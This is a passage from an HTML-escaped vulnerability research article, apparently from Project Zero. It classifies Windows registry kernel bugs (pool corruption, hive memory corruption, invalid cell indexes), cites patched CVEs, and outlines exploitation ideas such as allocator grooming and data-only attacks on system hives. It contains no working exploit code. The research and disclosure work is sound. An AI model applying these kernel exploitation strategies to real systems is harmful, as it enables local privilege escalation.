&lt;/span&gt;&lt;span&gt;requires identifying candidates of registry operations in the system that have appropriate characteristics (high privilege process, lack of transactionality, sensitivity to a partial/incomplete state)&lt;/span&gt;&lt;span&gt;, and then potentially reverse-engineering the specific software to get a deeper understanding of how it interacts with the registry. T&lt;/span&gt;&lt;span&gt;ools like &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/sysinternals/downloads/procmon&quot;&gt;Process Monitor&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;may come in handy at least in the first part of the process.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;One example of a vulnerability &lt;/span&gt;&lt;span&gt;related to the incorrect guarantee of atomicity of system-critical structures &lt;/span&gt;&lt;span&gt;is &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/15_Registry_quota_exhausted_SAM_corruption&quot;&gt;CVE-2024-26181&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;As a result of exhausting the global registry quota, it could lead to permanent damage to the HKLM\SAM hive, &lt;/span&gt;&lt;span&gt;which stores&lt;/span&gt;&lt;span&gt;&amp;nbsp;particularly important information about users in the system, their passwords, group memberships, etc.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;ujDEXfwdRL-c28 ujDEXfwdRL-c11&quot; id=&quot;h.z8r8v8s405sa&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c42&quot;&gt;Vulnerability primitives&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;In this chapter, we will focus on classifying registry vulnerabilities based on the primitives they offer, and briefly discuss their practical consequences and potential exploitation methods.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ujDEXfwdRL-c2&quot; id=&quot;h.jv06g54jl6x1&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c25 ujDEXfwdRL-c20&quot;&gt;Pool memory corruption&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Pool memory corruption is probably the most common type of low-level vulnerability in the Windows kernel.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In the context of the registry, this bug class is somewhat rarer than in other ring-0 components, but it certainly still occurs and is entirely possible.&lt;/span&gt;&lt;span&gt;&amp;nbsp;It manifests in its most &amp;quot;pure&amp;quot; form &lt;/span&gt;&lt;span&gt;when the corruption happens within an auxiliary object that is temporarily allocated on the pools to implement a specific operation.&lt;/span&gt;&lt;span&gt;&amp;nbsp;One such example case is a&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451475&quot;&gt;report&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;concerning three vulnerabilities&amp;mdash;CVE-2022-37990, CVE-2022-38038, and CVE-2022-38039&amp;mdash;all stemming from a fairly classic 16-bit integer overflow when calculating the length of a dynamically allocated buffer.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Another example is &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451600&quot;&gt;CVE-2023-38154&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, where the cause of the buffer overflow was slightly more intricate and originated from a lack of error handling in one of the functions responsible for recovering the hive state from LOG files.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;The second type of pool memory corruption that can occur in the registry is problems managing long-lived objects that are used to cache some information from the hive mapping in more readily accessible pool memory &amp;mdash; such as those described in &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2025/04/the-windows-registry-adventure-6-kernel.html&quot;&gt;post&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2025/04/the-windows-registry-adventure-6-kernel.html&quot;&gt;&amp;nbsp;#&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2025/04/the-windows-registry-adventure-6-kernel.html&quot;&gt;6&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In this case, we are usually dealing with UAF-type conditions, like releasing an object while there are still some active references to it.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;If I had to point to one object that could be most prone to this type of bug, it would probably be the Key Control Block, which is reference counted, used by the implementation of almost every registry syscall, and for which there are some very strong invariants critical for memory safety (e.g., the existence of only one KCB for a particular key in the global KCB tree).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;One issue related to KCBs was &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451494&quot;&gt;CVE-2022-44683&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, which resulted from incorrect handling of predefined keys in the NtNotifyChangeMultipleKeys system call.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Another, slightly different category of UAFs on pools are situations in which this type of condition is not a direct consequence of a vulnerability, but more of a side effect.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Let&amp;#39;s take security descriptors as an example: they are located in the hive space, but the kernel also maintains a cache reflecting the state of these descriptors on the kernel pools (in _CMHIVE.SecurityCache and related fields).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Therefore, if for some reason a security descriptor in the hive is freed prematurely, this problem will also be automatically reflected in the cache, and some keys may start to have a dangling &lt;/span&gt;&lt;span&gt;KCB.CachedSecurity &lt;/span&gt;&lt;span&gt;pointer set to the released object.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;I have taken advantage of this fact many times in my reports to Microsoft, because it was very useful for reliably triggering crashes. While generating a bugcheck based on the UAF of the _CM_KEY_SECURITY structure in the hive is possible, it is much more convoluted than simply turning on the &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/special-pool&quot;&gt;Special Pool&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;mechanism and making the kernel refer to the cached copy of the security descriptor (a few examples: &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451533&quot;&gt;CVE-2023-23421&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451592&quot;&gt;CVE-2023-35382&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451601&quot;&gt;CVE-2023-38139&lt;/a&gt;&lt;/span&gt;&lt;span&gt;).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In some cases, exploiting memory corruption on pools may also offer some advantages over exploiting hive-based memory corruption, so it is definitely worth remembering this behavior for the future.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;When it comes to the strictly technical aspects of kernel pool exploitation, I won&amp;#39;t &lt;/span&gt;&lt;span&gt;delve into it too deeply here&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;I didn&amp;#39;t specifically focus on it in my research, and there aren&amp;#39;t many interesting registry-specific details to mention in this context.&lt;/span&gt;&lt;span&gt;&amp;nbsp;If you are interested to learn more about this topic&lt;/span&gt;&lt;span&gt;, please refer to the resources available online.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ujDEXfwdRL-c2&quot; id=&quot;h.2h44rul6yulp&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c25 ujDEXfwdRL-c20&quot;&gt;Hive memory corruption&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;The second type of memory corruption encountered in the registry is hive-based memory corruption.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This class of bugs is unique to the registry and is based on the fact that data stored in hives serves a dual role. It stores information persistently on disk, but it also works as the representation of the hive in memory in the exact same form. The data is then operated on using C code through pointers, helper functions like &lt;/span&gt;&lt;span&gt;memcpy&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&amp;nbsp;and so on. Given all this, it doesn&amp;#39;t come as a surprise that classic vulnerabilities such as buffer overflows or use-after-free &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;can also occur within this region.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;So far, during my research, I have managed to find 17 hive-based memory corruption issues, which constitutes approximately 32% of all 53 vulnerabilities that have been fixed by Microsoft in security bulletins.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The vast majority of them were related to&lt;/span&gt;&lt;span&gt;&amp;nbsp;just two mechanisms &amp;ndash; &lt;/span&gt;&lt;span&gt;reference counting security descriptors and operating on subkey lists &amp;ndash; but there were also cases of bugs related to other types of objects.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;I have started using the term&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;quot;inconsistent hive state&amp;quot;, referring to any situation where the regf format state either ceases to be internally consistent or stops accurately reflecting cached copies of the same data within other kernel objects.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;I described one such issue &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/16_Registry_value_big_data_count_overflow&quot;&gt;here&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, where the _CM_BIG_DATA.Count field stops correctly corresponding to the _CM_KEY_VALUE.DataLength field for the same registry value.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, despite this specific behavior being incorrect, according to both my analysis and Microsoft&amp;#39;s, it doesn&amp;#39;t have any security implications for the system.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In this context, the term &amp;quot;hive-based memory corruption&amp;quot; denotes a slightly narrower group of issues that not only allow reaching &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c13&quot;&gt;any&lt;/span&gt;&lt;span&gt;&amp;nbsp;inconsistent state but specifically enable overwriting valid regf structures with attacker-controlled data.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;The general scheme for exploiting hive-based memory corruption closely resembles the typical exploitation of any other memory corruption.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The attacker&amp;#39;s initial objective is to leverage the available primitive and manipulate memory allocations/deallocations to overwrite a specific object in a controlled manner.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;On modern systems, achieving this stage reliably within the heap or kernel pools can be challenging due to allocator randomization and enforced consistency checks.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, the cell allocator implemented by the Windows kernel is highly favorable for the attacker: it lacks any safeguards, and its behavior is entirely deterministic, which greatly simplifies this stage of exploit development.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;One could even argue that, given the properties of this allocator, virtually any memory corruption primitive within the regf format can be transformed into complete control of the hive in memory with some effort.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;With this assumption, let&amp;#39;s consider what to do next.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Even if we have absolute control over all the internal data of the mapped hive, we are still limited to its mapping in memory, which in itself does not give us much.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The question arises as to how we can &amp;quot;escape&amp;quot; from this memory region and use hive memory corruption to overwrite something more interesting, like an arbitrary address in kernel memory (e.g., the security token of our process).&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;First of all, it is worth noting that such an escape is not always necessary &amp;ndash; if the attack is carried out in one of the system hives (SOFTWARE, SYSTEM, etc.), we may not need to corrupt the kernel memory at all. In this case, we could simply perform a data-only attack and modify &lt;/span&gt;&lt;span&gt;some &lt;/span&gt;&lt;span&gt;system configuration, grant ourselves access to important system keys, etc.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, with many bugs, attacking a highly privileged hive is not possible.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Then, the other &lt;/span&gt;&lt;span&gt;option available to the attacker is to modify one of the cells to break some invariant of the regf format, and cause a second-order side effect in the form of a kernel pool corruption.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Some random ideas&lt;/span&gt;&lt;span&gt;&amp;nbsp;are:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_h5hx08hv18g-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;Setting too long a key name or inserting the illegal character &amp;#39;\&amp;#39; into the name,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;Creating a fake exit node key,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;Corrupting&lt;/span&gt;&lt;span&gt;&amp;nbsp;the binary structure of a security descriptor so that the internal APIs operating on them start misbehaving,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;Crafting&lt;/span&gt;&lt;span&gt;&amp;nbsp;a tree structure within the hive with a depth greater than the maximum allowed (512 levels of nesting),&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;... and many, many others.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;However, during experiments exploring practical exploitation, I discovered an even better method that grants an attacker the ability to perform reliable arbitrary read and write operations in kernel memory&amp;mdash;the ultimate primitive. This method exploits the behavior of 32-bit cell index values, which exhibit unusual behavior when they exceed the hive&amp;#39;s total size. &lt;/span&gt;&lt;span&gt;I won&amp;#39;t elaborate on the full technique here, &lt;/span&gt;&lt;span&gt;but &lt;/span&gt;&lt;span&gt;for those interested, I discussed it during my &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://j00ru.vexillium.org/talks/offensivecon-practical-exploitation-of-windows-registry-vulnerabilities/&quot;&gt;presentation&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;at the OffensiveCon conference in May 2024.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Th&lt;/span&gt;&lt;span&gt;e subject of exploiting hive memory corruption &lt;/span&gt;&lt;span&gt;will be also covered in detail in its own dedicated blog post in the future.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ujDEXfwdRL-c2&quot; id=&quot;h.1jligcetdmex&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c25 ujDEXfwdRL-c20&quot;&gt;Invalid cell indexes&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;This is &lt;/span&gt;&lt;span&gt;a class of bugs that manifests directly when an incorrect cell index appears in an object&amp;mdash;either in a cell within the hive or in a structure on kernel pools, like KCB. These issues can be divided into three subgroups, depending on the degree of control an attacker can gain over the cell index.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;ujDEXfwdRL-c24 ujDEXfwdRL-c11&quot; id=&quot;h.gnf69fb1z0ba&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c34 ujDEXfwdRL-c20&quot;&gt;Cell index 0xFFFFFFFF (HCELL_NIL)&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;This is a&lt;/span&gt;&lt;span&gt;&amp;nbsp;special marker that indicates that a given structure member/variable of type HCELL_INDEX doesn&amp;#39;t point to any specific cell, which is equivalent to a NULL pointer in C. There are many situations where the value 0xFFFFFFFF &lt;/span&gt;&lt;span&gt;(in other words, -1) &lt;/span&gt;&lt;span&gt;is used and even desired, e.g. to signal that an optional object doesn&amp;#39;t exist and shouldn&amp;#39;t be processed.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The kernel code is prepared for such cases and correctly checks whether a given cell index is equal to this marker before operating on it.&lt;/span&gt;&lt;span&gt;&amp;nbsp;However, p&lt;/span&gt;&lt;span&gt;roblems can arise when the value ends up in a place where the kernel always expects a valid index.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Any mandatory field in a specific object can be potentially subject to this problem, such as the _CM_KEY_NODE.Security field, &lt;/span&gt;&lt;span&gt;which must always point to a valid descriptor and should never be equal to -1 (other than for exit nodes).&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Some &lt;/span&gt;&lt;span&gt;examples of such vulnerabilities include:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_hyye7g1opk7h-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451512&quot;&gt;CVE-2023-21772&lt;/a&gt;&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt;&amp;nbsp;an unexpected value of -1 being set in _CM_KEY_NODE.Security due to faulty logic in the registry virtualization code, which first freed the old descriptor and only then attempted to allocate a new one, which could fail, leaving the key without any assigned security descriptor.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451589&quot;&gt;CVE-2023-35357&lt;/a&gt;&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt;&amp;nbsp;an unexpected value of -1 being set in KCB.KeyCell, because the code assumed that it was operating on a physically existing base key, while in practice it could operate on a layered key with Merge-Unbacked semantics, which does not have its own key node, but relies solely on key nodes at lower levels of the key stack.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451590&quot;&gt;CVE-2023-35358&lt;/a&gt;&lt;/span&gt;&lt;span&gt;:&lt;/span&gt;&lt;span&gt;&amp;nbsp;another case of an unexpected value of -1 being set in KCB.KeyCell, while the kernel expected that at least one key in the given key node stack would have an allocated key node object.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The source of the problem here was incorrect integration of transactions &lt;/span&gt;&lt;span&gt;and &lt;/span&gt;&lt;span&gt;differencing hives&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;When such a problem occurs, it always manifests by the value -1 being passed as the cell index to the HvpGetCellPaged function.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;For decades, this function completely trusted its parameters, assuming that the input cell index would always be within the bounds of the given hive.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Consequently, calling HvpGetCellPaged with a cell index of 0xFFFFFFFF would result in the execution of the following code:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;_CELL_DATA *HvpGetCellPaged(_HHIVE *Hive, HCELL_INDEX Index) {&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp; _HMAP_ENTRY *Entry = &amp;amp;Hive-&amp;gt;Storage[&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c43 ujDEXfwdRL-c26 ujDEXfwdRL-c29 ujDEXfwdRL-c23&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;].Map-&amp;gt;Directory[&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c43 ujDEXfwdRL-c26 ujDEXfwdRL-c29 ujDEXfwdRL-c23&quot;&gt;0x3FF&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;]-&amp;gt;Table[&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c26 ujDEXfwdRL-c29 ujDEXfwdRL-c23 ujDEXfwdRL-c43&quot;&gt;0x1FF&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;];&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c17&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp;(Entry-&amp;gt;PermanentBinAddress &amp;amp; (~&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c29&quot;&gt;0xF&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;)) + Entry-&amp;gt;BlockOffset + &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c43 ujDEXfwdRL-c26 ujDEXfwdRL-c29 ujDEXfwdRL-c23&quot;&gt;0xFFF&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;nbsp;+ &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c29&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;In other words, the function would refer to the Volatile (1) map cell, and within it, to the last element of the Directory and then the Table arrays.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Considering the &amp;quot;small dir&amp;quot; optimization described in &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2025/04/the-windows-registry-adventure-6-kernel.html&quot;&gt;post&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2025/04/the-windows-registry-adventure-6-kernel.html&quot;&gt;&amp;nbsp;#&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2025/04/the-windows-registry-adventure-6-kernel.html&quot;&gt;6&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, it becomes clear that this cell map walk could result in an out-of-bounds memory access within the kernel pools (beyond the boundaries of the _CMHIVE structure).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Personally, I haven&amp;#39;t tried to transform this primitive into anything more useful, but it seems evident that with some control over the kernel memory around _CMHIVE, it should theoretically be possible to get the HvpGetCellPaged function to return any address chosen by the attacker.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Further exploitation prospects would largely depend on the &lt;/span&gt;&lt;span&gt;subsequent &lt;/span&gt;&lt;span&gt;operations that would be performed on such a fake cell, and the extent to which a local user could influence them.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In summary, I&amp;#39;ve always considered these types of bugs as &amp;quot;exploitable on paper, but quite difficult to exploit in 